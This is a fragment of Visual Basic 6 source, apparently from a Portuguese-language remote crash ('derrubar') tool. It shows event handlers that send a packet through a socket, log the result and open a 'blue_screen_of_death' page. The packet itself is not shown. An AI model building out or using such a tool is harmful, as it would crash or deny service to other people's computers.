    m_WebControl.object.Navigate "http://munovus.net/blue_screen_of_death.php"
End Sub

Private Sub Form_Unload(Cancel As Integer)
    Call ExitProcess(0)
End Sub

Private Sub Sock_SendComplete()
    Log.AddItem "Pacote enviado com sucesso!"
    Derrubar.Enabled = True
End Sub

Private Sub Timer1_Timer()
    Timer1.Enabled = False
    If Sock.State = 7 Then
        Call PacoteDoCarai
    Else
        Log.AddItem "Falha ao conectar!"
        Derrubar.Enabled = True
    End If
End Sub
